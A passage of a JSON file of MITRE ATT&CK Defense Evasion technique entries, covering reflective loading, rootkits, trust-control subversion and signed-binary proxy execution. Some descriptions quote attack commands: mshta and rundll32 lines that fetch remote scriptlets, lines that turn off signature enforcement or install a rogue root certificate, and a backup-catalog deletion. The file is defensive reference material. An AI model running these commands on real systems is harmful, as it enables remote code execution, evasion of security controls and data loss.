    "last_updated": "2025-07-02T13:11:53.240139"
  },
  {
    "technique_id": "T1620",
    "name": "Reflective Code Loading",
    "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g.,Shared Modules).Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).[1][2][3][4][5]For example, theAssembly.Load()method executed byPowerShellmay be abused to load raw code into the running process.[6]Reflective code injection is very similar toProcess Injectionexcept that the \"injection\" loads code into the processesâ€™ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.[3][4][7][8]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:56.590776",
    "subtechniques": []
  },
  {
    "technique_id": "T1207",
    "name": "Rogue Domain Controller",
    "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.[1]Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.[2]This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).[1]The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to performSID-History Injectionand/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:59.948013",
    "subtechniques": []
  },
  {
    "technique_id": "T1014",
    "name": "Rootkit",
    "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.[1]Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, orSystem Firmware.[2]Rootkits have been seen for Windows, Linux, and Mac OS X systems.[3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:03.317259",
    "subtechniques": []
  },
  {
    "technique_id": "T1553",
    "name": "Subvert Trust Controls",
    "description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conductFile and Directory Permissions ModificationorModify Registryin support of subverting these controls.[1]Adversaries may also create or steal code signing certificates to acquire trust on target systems.[2][3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:07.670252",
    "subtechniques": [
      {
        "id": "T1553.002",
        "name": "Code Signing"
      },
      {
        "id": "T1553.003",
        "name": "SIP and Trust Provider Hijacking"
      },
      {
        "id": "T1553.004",
        "name": "Install Root Certificate"
      },
      {
        "id": "T1553.005",
        "name": "Mark-of-the-Web Bypass"
      },
      {
        "id": "T1553.006",
        "name": "Code Signing Policy Modification"
      }
    ]
  },
  {
    "technique_id": "T1553.002",
    "name": "Code Signing",
    "description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.[1]The certificates used during an operation may be created, acquired, or stolen by the adversary.[2][3]UnlikeInvalid Code Signature, this activity will result in a valid signature.Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform.[1][4]Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Subvert Trust Controls",
    "parent_technique_id": "T1553",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:11.054705"
  },
  {
    "technique_id": "T1553.003",
    "name": "SIP and Trust Provider Hijacking",
    "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode[1]digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,[2]which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.[3]Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)[4]to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all[5]) and are identified by globally unique identifiers (GUIDs).[3]Similar toCode Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by:[3]Modifying theDllandFuncNameRegistry values inHKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID}that point to the dynamic link library (DLL) providing a SIPâ€™s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the fileâ€™s real signature, an adversary can apply an acceptable signature value to all files using that SIP[6](although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).Modifying theDllandFuncNameRegistry values inHKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID}that point to the DLL providing a SIPâ€™s CryptSIPDllVerifyIndirectData function, which validates a fileâ€™s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP[6](with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.Modifying theDLLandFunctionRegistry values inHKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID}that point to the DLL providing a trust providerâ€™s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIPâ€™s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).Note:The above hijacks are also possible without modifying the Registry viaDLLsearch order hijacking.Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Subvert Trust Controls",
    "parent_technique_id": "T1553",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:14.419601"
  },
  {
    "technique_id": "T1553.004",
    "name": "Install Root Certificate",
    "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.[1]Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.[2]Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provideAdversary-in-the-Middlecapability for intercepting information transmitted over secure TLS/SSL communications.[3]Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.[4]In macOS, the Ay MaMi malware uses/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/certto install a malicious certificate as a trusted root certificate into the system keychain.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Subvert Trust Controls",
    "parent_technique_id": "T1553",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:17.775298"
  },
  {
    "technique_id": "T1553.005",
    "name": "Mark-of-the-Web Bypass",
    "description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) namedZone.Identifierwith a specific value known as the MOTW.[1]Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.[2][3][4]Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.[2][3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Subvert Trust Controls",
    "parent_technique_id": "T1553",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:21.223605"
  },
  {
    "technique_id": "T1553.006",
    "name": "Code Signing Policy Modification",
    "description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.[1][2]Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.[3][2]Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities,Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.[4][2][5][6]Examples of commands that can modify the code signing policy of a system includebcdedit.exe -set TESTSIGNING ONon Windows andcsrutil disableon macOS.[4][2]Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.[7]To gain access to kernel memory to modify variables related to signature checks, such as modifyingg_CiOptionsto disable Driver Signature Enforcement, adversaries may conductExploitation for Privilege Escalationusing a signed, but vulnerable driver.[8][6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Subvert Trust Controls",
    "parent_technique_id": "T1553",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:24.605973"
  },
  {
    "technique_id": "T1218",
    "name": "System Binary Proxy Execution",
    "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.[1]Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.Similarly, on Linux systems adversaries may abuse trusted binaries such assplitto proxy execution of malicious commands.[2][3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:27.934989",
    "subtechniques": [
      {
        "id": "T1218.001",
        "name": "Compiled HTML File"
      },
      {
        "id": "T1218.002",
        "name": "Control Panel"
      },
      {
        "id": "T1218.003",
        "name": "CMSTP"
      },
      {
        "id": "T1218.004",
        "name": "InstallUtil"
      },
      {
        "id": "T1218.005",
        "name": "Mshta"
      },
      {
        "id": "T1218.007",
        "name": "Msiexec"
      },
      {
        "id": "T1218.008",
        "name": "Odbcconf"
      },
      {
        "id": "T1218.009",
        "name": "Regsvcs/Regasm"
      },
      {
        "id": "T1218.010",
        "name": "Regsvr32"
      },
      {
        "id": "T1218.011",
        "name": "Rundll32"
      },
      {
        "id": "T1218.012",
        "name": "Verclsid"
      },
      {
        "id": "T1218.013",
        "name": "Mavinject"
      },
      {
        "id": "T1218.014",
        "name": "MMC"
      },
      {
        "id": "T1218.015",
        "name": "Electron Applications"
      }
    ]
  },
  {
    "technique_id": "T1218.001",
    "name": "Compiled HTML File",
    "description": "Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.[1]CHM content is displayed using underlying components of the Internet Explorer browser[2]loaded by the HTML Help executable program (hh.exe).[3]A custom CHM file containing embedded payloads could be delivered to a victim then triggered byUser Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.[4][5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:31.256643"
  },
  {
    "technique_id": "T1218.002",
    "name": "Control Panel",
    "description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export aCPlAppletfunction.[1][2]For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.[1]Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.[1][2][3]Malicious Control Panel items can be delivered viaPhishingcampaigns[2][3]or executed as part of multi-stage malware.[4]Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them toHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not exportCPlAppletfunctions, they are loaded and executed through itsDllEntryPointwhen Control Panel is executed. CPL files not exportingCPlAppletare not directly executable.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:34.633802"
  },
  {
    "technique_id": "T1218.003",
    "name": "CMSTP",
    "description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.[1]CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands.[2]Similar toRegsvr32/ \"Squiblydoo\", CMSTP.exe may be abused to load and execute DLLs[3]and/or COM scriptlets (SCT) from remote servers.[4][5][6]This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.CMSTP.exe can also be abused toBypass User Account Controland execute arbitrary commands from a malicious INF through an auto-elevated COM interface.[3][5][6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:37.974938"
  },
  {
    "technique_id": "T1218.004",
    "name": "InstallUtil",
    "description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.[1]The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system:C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exeandC:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe.InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute[System.ComponentModel.RunInstaller(true)].[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:41.322722"
  },
  {
    "technique_id": "T1218.005",
    "name": "Mshta",
    "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code[1][2][3][4][5]Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.[6]HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.[7]Files may be executed by mshta.exe through an inline script:mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))They may also be executed directly from URLs:mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.[8]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:44.685881"
  },
  {
    "technique_id": "T1218.007",
    "name": "Msiexec",
    "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).[1]The Msiexec.exe binary may also be digitally signed by Microsoft.Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.[2][3]Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if theAlwaysInstallElevatedpolicy is enabled.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:48.063698"
  },
  {
    "technique_id": "T1218.008",
    "name": "Odbcconf",
    "description": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.[1]The Odbcconf.exe binary may be digitally signed by Microsoft.Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar toRegsvr32, odbcconf.exe has aREGSVRflag that can be misused to execute DLLs (ex:odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}).[2][3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:51.404211"
  },
  {
    "technique_id": "T1218.009",
    "name": "Regsvcs/Regasm",
    "description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NETComponent Object Model(COM) assemblies. Both are binaries that may be digitally signed by Microsoft.[1][2]Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration:[ComRegisterFunction]or[ComUnregisterFunction]respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.[3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:54.740635"
  },
  {
    "technique_id": "T1218.010",
    "name": "Regsvr32",
    "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.[1]Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.[2]This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.[3][4]Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence viaComponent Object Model Hijacking.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:12:58.079327"
  },
  {
    "technique_id": "T1218.011",
    "name": "Rundll32",
    "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to executeControl PanelItem files (.cpl) through the undocumented shell32.dll functionsControl_RunDLLandControl_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.[1]For example,ClickOncecan be proxied through Rundll32.exe.Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"This behavior has been seen used by malware such as Poweliks.[2]Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the commandrundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to executeExampleFunctionW, or failing thatExampleFunctionA, before loadingExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appendingWand/orAto harmless ones.[3][4]DLL functions can also be exported and executed by an ordinal number (ex:rundll32.exe file.dll,#1).Additionally, adversaries may useMasqueradingtechniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:01.500230"
  },
  {
    "technique_id": "T1218.012",
    "name": "Verclsid",
    "description": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.[1]Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by runningverclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar toRegsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.[2][3][4][5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:04.826454"
  },
  {
    "technique_id": "T1218.013",
    "name": "Mavinject",
    "description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).[1]Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e.Dynamic-link Library Injection), allowing for arbitrary code execution (ex.C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL).[2][3]Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.In addition toDynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its/HMODULEcommand-line parameter (ex.mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:08.172169"
  },
  {
    "technique_id": "T1218.014",
    "name": "MMC",
    "description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.[1][2]MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.[3]For example,mmc C:\\Users\\foo\\admintools.msc /awill open a custom, saved console msc file in author mode.[1]Another common example ismmc gpedit.msc, which will open the Group Policy Editor application window.Adversaries may use MMC commands to perform malicious tasks. For example,mmc wbadmin.msc delete catalog -quietdeletes the backup catalog on the system (i.e.Inhibit System Recovery) without prompts to the user (Note:wbadmin.mscmay only be present by default on Windows Server operating systems).[4][5]Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies aComponent Object Modelclass object.[6]Then, adversaries may create custom consoles with the \"Link to Web 